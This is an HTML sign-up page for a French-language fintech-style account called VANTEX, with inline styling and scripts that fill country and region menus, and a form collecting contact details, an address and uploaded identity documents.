<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Cr√©er un compte VANTEX</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/css/intlTelInput.css" />

<style>

/* === THEME FINTECH N26/WISE === */
body {
    margin: 0;
    font-family: "Inter", sans-serif;
    background: #F5FAFA; 
}

/* Container mobile-first */
.form-wrapper {
    max-width: 460px;
    margin: auto;
    padding: 22px;
}

/* TITRE */
h1 {
    font-size: 1.9rem;
    font-weight: 700;
    text-align: center;
    color: #0A5050;
    margin-bottom: 6px;
}
p.subtitle {
    text-align: center;
    color: #327575;
    margin-bottom: 26px;
}

/* BLOCS */
.block {
    margin-bottom: 22px;
}

/* LABEL PRO FIXE (pas flottant) */
label {
    font-size: 0.92rem;
    font-weight: 600;
    color: #064D4D;
    margin-bottom: 6px;
    display: block;
}

/* INPUT FINTECH */
input, select {
    width: 100%;
    padding: 14px;
    border-radius: 12px;
    border: 1.6px solid #B8DCDC;
    background: #fff;
    font-size: 1rem;
    outline: none;
    transition: .2s;
}

input:focus, select:focus {
    border-color: #0A9999;
    box-shadow: 0 0 0 3px rgba(10,153,153,0.2);
}

/* Ic√¥nes dans champs */
.input-icon {
    position: relative;
}
.input-icon i {
    position: absolute;
    left: 14px;
    top: 50%;
    transform: translateY(-50%);
    font-size: 1.1rem;
    color: #0A9999;
}
.input-icon input {
    padding-left: 40px;
}

/* BOUTON */
.btn {
    width: 100%;
    padding: 16px;
    border-radius: 12px;
    border: none;
    background: #0A9999;
    color: #fff;
    font-size: 1.15rem;
    font-weight: 700;
    cursor: pointer;
    transition: .25s;
}
.btn:hover {
    background: #066F6F;
}

/* DESKTOP */
@media (min-width: 900px) {
    body {
        background: linear-gradient(135deg, #0A9999 0%, #066F6F 80%);
    }
    .form-wrapper {
        margin-top: 60px;
        background: #fff;
        padding: 40px;
        border-radius: 18px;
        box-shadow: 0 15px 40px rgba(0,0,0,0.15);
    }
    h1, p.subtitle { color: #044646; }
}

</style>
</head>

<body>

<div class="form-wrapper">

    <h1>Cr√©er un compte</h1>
    <p class="subtitle">Ouverture moderne et s√©curis√©e</p>

    <form action="/paiement/vantex/submit" method="POST" enctype="multipart/form-data">

        <div class="block">
            <label>Civilit√©</label>
            <select name="civility" required>
                <option value="">Choisir</option>
                <option>Mr</option>
                <option>Mme</option>
                <option>Mlle</option>
            </select>
        </div>

        <div class="block">
            <label>Pr√©nom</label>
            <div class="input-icon">
                <i>üë§</i>
                <input type="text" name="firstname" required>
            </div>
        </div>

        <div class="block">
            <label>Nom</label>
            <div class="input-icon">
                <i>üë§</i>
                <input type="text" name="lastname" required>
            </div>
        </div>

        <div class="block">
            <label>Email</label>
            <div class="input-icon">
                <i>üìß</i>
                <input type="email" name="email" required>
            </div>
        </div>

        <div class="block">
            <label>T√©l√©phone</label>
            <input type="tel" id="phone" name="phone" required>
        </div>

        <div class="block">
            <label>Profession</label>
            <input type="text" name="profession" required>
        </div>

        <div class="block">
            <label>Pays</label>
            <select id="country" name="country" required>
                <option value=""></option>
            </select>
        </div>

        <div class="block">
            <label>R√©gion / Province</label>
            <select id="region" name="region" required disabled>
                <option value=""></option>
            </select>
        </div>

        <div class="block">
            <label>Rue</label>
            <input type="text" name="street" required>
        </div>

        <div class="block">
            <label>Ville</label>
            <input type="text" name="city" required>
        </div>

        <div class="block">
            <label>Code Postal</label>
            <input type="text" name="zip" required>
        </div>

        <div class="block">
            <label>Document d'identit√© (recto)</label>
            <input type="file" name="id_front" required>
        </div>

        <div class="block">
            <label>Document d'identit√© (verso)</label>
            <input type="file" name="id_back" required>
        </div>

        <button class="btn">Cr√©er mon compte</button>

    </form>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/intlTelInput.min.js"></script>

<script>

document.addEventListener("DOMContentLoaded", () => {

    /* === TELEPHONE FINTECH PRO === */
    const phone = document.querySelector("#phone");
    window.intlTelInput(phone, {
        separateDialCode: true,
        preferredCountries: ["fr"],
        initialCountry: "fr",
        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/utils.js"
    });

    /* === PAYS === */
    async function loadCountries() {
        const res = await fetch("/json/countries.json");
        const data = await res.json();
        const select = document.getElementById("country");

        data.sort((a,b) => a.name.common.localeCompare(b.name.common));

        data.forEach(c => {
            const opt = document.createElement("option");
            opt.value = c.cca2;
            opt.textContent = c.name.common;
            select.appendChild(opt);
        });
    }

    async function loadRegions(code) {
        const regionSelect = document.getElementById("region");
        const res = await fetch("/json/regions.json");
        const all = await res.json();

        const list = all[code] || [];
        regionSelect.innerHTML = '<option value=""></option>';
        regionSelect.disabled = list.length === 0;

        list.forEach(r => {
            const opt = document.createElement("option");
            opt.value = r;
            opt.textContent = r;
            regionSelect.appendChild(opt);
        });
    }

    loadCountries();
    document.getElementById("country").addEventListener("change", e => {
        loadRegions(e.target.value);
    });

});
</script>

</body>
</html>





